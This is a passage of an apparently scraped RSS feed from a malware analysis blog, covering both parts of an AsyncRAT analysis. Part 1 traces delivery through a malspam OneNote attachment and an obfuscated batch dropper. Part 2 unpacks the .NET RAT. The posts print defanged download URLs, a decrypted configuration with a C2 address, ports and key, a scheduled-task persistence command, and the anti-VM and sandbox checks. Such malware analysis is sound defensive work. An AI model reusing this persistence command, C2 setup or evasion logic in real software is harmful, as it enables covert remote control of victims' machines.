<p style="text-align: center;"><img decoding="async" src="/blog/wp-content/uploads/2023/01/text-description-automatically-generated-5.png" alt="Text Description automatically generated" /><br />
<strong>Figure 4: Breakpoint set on “return memoryStream2.ToArray()”, contents of _buffer is a dumped executable (File header: 0x4D5A).<br />
</strong></p>
<p style="text-align: center;"><img decoding="async" src="/blog/wp-content/uploads/2023/01/word-image-39-6-1.png" /> <strong>Figure 5: MemoryDump Window 2 shows contents of _buffer which is a dumped executable (File header: MZ).</strong></p>
<p>A quick look at this file in CFF Explorer (Fig. 6). I can confirm after reviewing its strings, that the dumped binary is an unpacked version of ASyncRAT. I re-named this file unpacked_payload.exe (Original Filename: AsyncClientnownow.exe).</p>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/table-description-automatically-generated-3.png" alt="Table Description automatically generated" /><strong>Figure 6: File property details of unpacked_payload.exe (AsyncClientnownow.exe) shown in CFF Explorer.</strong></p>
<p>Analysis of unpacked ASyncRaT</p>
<p>Next, I load unpacked_payload.exe (AsyncClientnownow.exe) into DnSpy for analysis. The Main() function initializes settings and flow of code execution. The delay function defines the sleep duration (3 seconds) before execution.</p>
<p>Mutex</p>
<p>if (!MutexControl.CreateMutex())</p>
<p>Environment.Exit(0);</p>
<p>It checks to make sure that the current payload is not duplicated by checking if the Mutex value already exist (MTX = &#8220;AsyncMutex_6SI8OkPnk&#8221;). (Fig. 7).</p>
<p>InitializeSettings</p>
<p>if (!Settings.InitializeSettings())</p>
<p>Environment.Exit(0);</p>
<p>The InitializeSettings function enables all hardcoded configurations and settings (Figure 7). It also enables decryption of all configuration settings from the AES256 algorithm. (Fig. 8).</p>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/text-description-automatically-generated-6.png" alt="Text Description automatically generated" /><strong>Figure 7: Main() function.</strong></p>
<pre></pre>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/text-description-automatically-generated-7.png" alt="Text Description automatically generated" /><strong>Figure 8: InitializeSettings function, where you can see the decryption of all configuration settings from the AES256 algorithm.</strong></p>
<p>Configuration Settings</p>
<p>Below are the decrypted hardcoded configuration settings:</p>
<p><em>Key: JXkxqn0C8WXhwunn5UZ2PfINpI6joafo </em></p>
<p><em>Ports: 6606, 7707, 8808 </em></p>
<p><em>Hosts: 154.12.234.207 </em></p>
<p><em>Version: 0.5.7B </em></p>
<p><em>Install: False </em></p>
<p><em>MTX (Mutex): AsyncMutex_6SI8OkPnk </em></p>
<p><em>Pastebin: null </em></p>
<p><em>Anti: False </em></p>
<p><em>BDOS: False</em></p>
<p style="text-align: center;"><img decoding="async" class="alignnone size-full wp-image-1091 aligncenter" src="/blog/wp-content/uploads/2023/01/payload_traffic_154.12.234.207.png" alt="" width="1873" height="107" srcset="/blog/wp-content/uploads/2023/01/payload_traffic_154.12.234.207.png 1873w, /blog/wp-content/uploads/2023/01/payload_traffic_154.12.234.207-300x17.png 300w, /blog/wp-content/uploads/2023/01/payload_traffic_154.12.234.207-1024x58.png 1024w, /blog/wp-content/uploads/2023/01/payload_traffic_154.12.234.207-768x44.png 768w, /blog/wp-content/uploads/2023/01/payload_traffic_154.12.234.207-1536x88.png 1536w" sizes="(max-width: 1873px) 100vw, 1873px" /><strong>Figure 9: Connection to C2 server (154.12.234.207) to check-in.</strong></p>
<p>Anti Analysis</p>
<p>The Anti Analysis function includes multiple subfunctions to check for the following anti-analysis tools such as (Fig. 10):</p>
<ul>
<li>Detect Manufacturer: enables anti-VM (virtual machine) techniques by using WMI to check for VM environments by querying for the following keywords: “Microsoft Corporation”, “VIRTUAL”, “VMware”, or “VirtualBox”.</li>
<li>Detect Sandbox: checks for the presence of “SbieDll.dll”, to detect if it is running in a sandbox (Sandboxie).</li>
<li>IsSmallDisk: checks for small disk less (than or equal to 61000000000L (56.8 GB)) that may be often used by virtual machines designed for malware analysis.</li>
<li>IsXP: checks whether the operating system is Windows XP.</li>
<li>Anti-Virus Check: checks for which antivirus product is installed in the system by using WMI query command: “<a href="file:///\rootSecurityCenter2"><strong>\rootSecurityCenter2</strong></a><strong>”</strong>. This pulls this information from Windows security Center.</li>
<li>Detect Debugger: calls <em>CheckRemoteDebuggerPresent</em> which checks if a debugger (in a different process on the same machine) is attached to the current process.</li>
</ul>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/a-screenshot-of-a-computer-description-automatica-3.png" alt="A screenshot of a computer Description automatically generated with medium confidence" /><strong>Figure 10: Anti_Analysis function.</strong></p>
<p>Install and Persistence</p>
<p>ASyncRAT’s Install function maintains persistence checks as to whether the user has admin privileges. This occurs by creating a scheduled task to check every time a user logs on (Fig. 11):</p>
<p><strong>“/</strong>c schtasks /create /f /sc onlogon /rl highest /tn”</p>
<p>If the process reveals there are no admin privileges, a run registry entry is created in HKEY_CURRENT_USER: “Software\Microsoft\Windows\CurrentVersion\Run”; it then copies itself into a “%temp%” folder with a different name and executes from the temp folder via a batch script (Fig. 12 &amp;13).</p>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/text-description-automatically-generated-8.png" alt="Text Description automatically generated" /><strong>Figure 11: Install function.</strong></p>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/text-description-automatically-generated-9.png" alt="Text Description automatically generated" /><strong>Figure 12: Batch script used for Persistence.</strong></p>
<p style="text-align: center;"><img decoding="async" class="aligncenter" src="/blog/wp-content/uploads/2023/01/graphical-user-interface-table-description-autom-1.png" alt="Graphical user interface, table Description automatically generated" /><strong> Figure 13: Registry key used for Persistence.</strong></p>
<p>From there, the attacker can execute various commands on the infected system, including:</p>
<p>• Downloading additional malware (i.e. Remos)</p>
<p>• Executing programs and commands</p>
<p>• Taking screenshots</p>
<p>• Logging keystrokes</p>
<p>• Turning on the microphone and/or webcam to spy on the victim</p>
<p>Detection and Prevention</p>
<p>To detect and prevent ASyncRat attacks, it is important to be aware of the following:</p>
<p>• Suspicious email attachments</p>
<p>• Suspicious network activity</p>
<p>• Slow system performance</p>
<p>• Unusual pop-up windows and error messages</p>
<p>It is also recommended to implement the following best practices:</p>
<p>• Keep software and security systems up to date</p>
<p>• Educate employees on the dangers of phishing emails and malspam</p>
<p>• Use Anti-Virus with real-time protection</p>
<p>• Enable firewalls and limit incoming connections</p>
<p>• Regularly backup important data and store those backups offline</p>
<p>Conclusion</p>
<p>ASyncRat is a malicious RAT that can compromise the security of a target system and allow remote attackers to gain unauthorized access and control. To protect against ASyncRat attacks, it is important to be aware of the signs of infection and implement best practices for cybersecurity. By staying informed and vigilant, organizations and individuals can reduce their risk of falling victim to ASyncRat.</p>
<p>IOCs:</p>
<p>payload.exe (Original Filename: tmp4D28.tmp) (MD5: FCF99858964E59B68B0433B135B499BB)</p>
<p>unpacked_payload.exe (AsyncClientnownow.exe) (MD5: e9d6d1ed7007d55c6a9ec576ff1f0172)</p>
<p>C2 IOCs:</p>
<p>154.12.234[.]207 (wormxwar.ddns[.]net, quasharr.ddns[.]net)</p><p>The post <a href="/blog/post_1-23-23_asyncrat_sample_part_2/">ASyncRAT delivered through malspam via OneNote attachment (Stage 2)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_1-23-23_asyncrat_sample_part_2/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>ASyncRAT delivered through malspam via OneNote attachment (Stage 1)</title>
		<link>/blog/post_1-23-23_asyncrat_sample_part_1/?utm_source=rss#038;utm_medium=rss&#038;utm_campaign=post_1-23-23_asyncrat_sample_part_1</link>
					<comments>/blog/post_1-23-23_asyncrat_sample_part_1/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Mon, 23 Jan 2023 04:12:59 +0000</pubDate>
				<category><![CDATA[Malware Analysis]]></category>
		<category><![CDATA[asyncrat]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[onenote malware]]></category>
		<category><![CDATA[rat]]></category>
		<guid isPermaLink="false">http://malwr0nwind0z.local/?p=972</guid>

					<description><![CDATA[<p>AsyncRat: A Remote Administration Trojan (RAT) AsyncRat is a malicious Remote Administration Trojan (RAT) that has been actively used in cyber attacks since 2019. This malware is designed to compromise the security of a target system and allow remote attackers to gain unauthorized access and control. In this blog post, we will analyze the behavior &#8230;</p>
<p class="read-more"> <a class="" href="/blog/post_1-23-23_asyncrat_sample_part_1/"> <span class="screen-reader-text">ASyncRAT delivered through malspam via OneNote attachment (Stage 1)</span> Read More &#187;</a></p>
<p>The post <a href="/blog/post_1-23-23_asyncrat_sample_part_1/">ASyncRAT delivered through malspam via OneNote attachment (Stage 1)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<p><img decoding="async" src="/blog/wp-content/uploads/2023/02/word-image-972-1.jpeg" /></p>
<p>AsyncRat: A Remote Administration Trojan (RAT)</p>
<p>AsyncRat is a malicious Remote Administration Trojan (RAT) that has been actively used in cyber attacks since 2019. This malware is designed to compromise the security of a target system and allow remote attackers to gain unauthorized access and control. In this blog post, we will analyze the behavior and characteristics of AsyncRat to better understand how it operates and how to protect against it.</p>
<p>How This AsyncRat Infection Works</p>
<p>The AsyncRat is typically delivered to the victim through various methods, including phishing emails, social engineering tactics, and exploiting vulnerabilities in unpatched software. In some cases, the malware may also be delivered through drive-by downloads, where the victim unwittingly downloads the malware while visiting a compromised website. The exact method of delivery may vary depending on the attackers&#8217; goals and the target&#8217;s specific vulnerabilities.</p>
<p>In this instance it was delivered through malspam that contain a malicious Microsoft OneNote document within a zip archive named Invoice #099272663.zip. The malicious OneNote document (Invoice #099272663.one) contained a social engineering “CLICK TO VIEW DOCUMENT” image, that once clicked, it executes embedded VBScript.</p>
<h6 style="text-align: center;"><img decoding="async" class="size-large wp-image-1001 aligncenter" src="/blog/wp-content/uploads/2023/01/onenote_screenshot-1024x658.png" alt="" width="1024" height="658" srcset="/blog/wp-content/uploads/2023/01/onenote_screenshot-1024x658.png 1024w, /blog/wp-content/uploads/2023/01/onenote_screenshot-300x193.png 300w, /blog/wp-content/uploads/2023/01/onenote_screenshot-768x494.png 768w, /blog/wp-content/uploads/2023/01/onenote_screenshot.png 1398w" sizes="(max-width: 1024px) 100vw, 1024px" />Figure 1: Embedded social engineering “CLICK TO VIEW DOCUMENT” image in the OneNote document (Invoice #099272663.one)</h6>
<p>The VBScript invokes PowerShell to download a benign decoy OneNote document and a malicious batch script from the following URLs:</p>
<p>Download URL: hxxps://www.onenotegem[.]com/uploads/soft/one-templates/the_daily_schedule.one</p>
<p><a id="post-972-_Hlk126684701"></a> Drop folder location: C:Users&lt;Username&gt;AppDataLocalTempinvoice.one (Classification: benign decoy OneNote document used to trick the victim into thinking that all is well, after clicking on the aforementioned embedded social engineering “CLICK TO VIEW DOCUMENT” image)</p>
<p>Download URL: hxxps://transfer[.]sh/get/bjLvT5/AsyncClientnownow.bat</p>
<p>Drop folder location: C:Users&lt;Username&gt;AppDataLocalTempsystem32.bat (Classification: ASyncRAT loader &#8211; malicious batch file)</p>
<h6 style="text-align: center;"><img decoding="async" class="alignnone size-full wp-image-1002" src="/blog/wp-content/uploads/2023/01/onenote_malicious_vbscript.png" alt="" width="1920" height="950" srcset="/blog/wp-content/uploads/2023/01/onenote_malicious_vbscript.png 1920w, /blog/wp-content/uploads/2023/01/onenote_malicious_vbscript-300x148.png 300w, /blog/wp-content/uploads/2023/01/onenote_malicious_vbscript-1024x507.png 1024w, /blog/wp-content/uploads/2023/01/onenote_malicious_vbscript-768x380.png 768w, /blog/wp-content/uploads/2023/01/onenote_malicious_vbscript-1536x760.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" />Figure 2: Embedded VBScript that when executed downloads a decoy OneNote document and a malicious batch script.</h6>
<p>Spoilers!! The batch script (AsyncClientnownow.bat) that is downloaded to the system and executed, will ultimately drop and executed a ASyncRAT executable (payload.exe). The ASyncRAT executable is written in Microsoft .NET Framework. The batch script is classified as a ASyncRAT dropper.</p>
<p>Next, I will briefly discuss how the heavily obfuscated batch script works. The first part of its code is an obfuscated executable file and the second part is an base64 encoded PowerShell script.</p>
<h6 style="text-align: center;"><img decoding="async" class="alignnone size-full wp-image-977" src="/blog/wp-content/uploads/2023/02/graphical-user-interface-text-description-automa.png" alt="Graphical user interface, text Description automatically generated" width="1920" height="951" srcset="/blog/wp-content/uploads/2023/02/graphical-user-interface-text-description-automa.png 1920w, /blog/wp-content/uploads/2023/02/graphical-user-interface-text-description-automa-300x149.png 300w, /blog/wp-content/uploads/2023/02/graphical-user-interface-text-description-automa-1024x507.png 1024w, /blog/wp-content/uploads/2023/02/graphical-user-interface-text-description-automa-768x380.png 768w, /blog/wp-content/uploads/2023/02/graphical-user-interface-text-description-automa-1536x761.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /> Figure 3: Obfuscated batch script that contains an encrypted ASyncRAT binary.</h6>
<p>Once the base64 encoded PowerShell script is run it is de-obfuscated during runtime. A review of this PowerShell shows that it is used to de-obfuscate the first part of code in the batch script utilizing base64 decode, AES Decryption (Key and IV), and Gunzip. The resulting de-obfuscated code turns out to be the aforementioned ASyncRAT executable file, which is then loaded into memory and executed.</p>
<h6 style="text-align: center;"><img decoding="async" class="alignnone size-large wp-image-978" src="/blog/wp-content/uploads/2023/02/text-description-automatically-generated-1-1024x248.png" alt="Text Description automatically generated" width="1024" height="248" srcset="/blog/wp-content/uploads/2023/02/text-description-automatically-generated-1-1024x248.png 1024w, /blog/wp-content/uploads/2023/02/text-description-automatically-generated-1-300x73.png 300w, /blog/wp-content/uploads/2023/02/text-description-automatically-generated-1-768x186.png 768w, /blog/wp-content/uploads/2023/02/text-description-automatically-generated-1.png 1279w" sizes="(max-width: 1024px) 100vw, 1024px" /> Figure 4: A portion of the de-obfuscated batch script that shows the PowerShell script.</h6>
<p>During my manual analysis, I was able to decrypt the obfuscated executable file using CyberChef. As I mentioned earlier it is classified as ASyncRAT and written in Microsoft .NET Framework. I re-named this file payload.exe.</p>
<h6 style="text-align: center;"><img decoding="async" src="/blog/wp-content/uploads/2023/02/graphical-user-interface-text-application-descr.png" alt="Graphical user interface, text, application Description automatically generated" /> Figure 5: De-obfuscating the first part of the batch script using CyberChef. The file header is MZ, revealing that it is a Windows executable file.</h6>
<p>That ends Part 1 of this blog, which was just analyzing stage 1 of this infection. In Part 2 of this blog post I will review stage 2, which will cover the analysis of the ASyncRAT payload and dive into some of its functionalities.</p>
<p>IOCs:</p>
<p>Invoice #099272663.zip (MD5: 5879DA120E13BC22DE3697D4A3CB2878)</p>
<p>Invoice #099272663.one (MD5: 12B1656C766432FB6FE46AB8C40EE209)</p>
<p>invoice.one (the_daily_schedule.one) (MD5: 8AABD7680DBDC7EB95340D69ADA9D25C)</p>
<p>system32.bat (asyncClientnownow.bat) (MD5: C3AD255AB5B6318DB06602485D8D9CA0)</p>
<p>payload.exe (Original Filename: tmp4D28.tmp) (MD5: FCF99858964E59B68B0433B135B499BB)</p><p>The post <a href="/blog/post_1-23-23_asyncrat_sample_part_1/">ASyncRAT delivered through malspam via OneNote attachment (Stage 1)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_1-23-23_asyncrat_sample_part_1/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
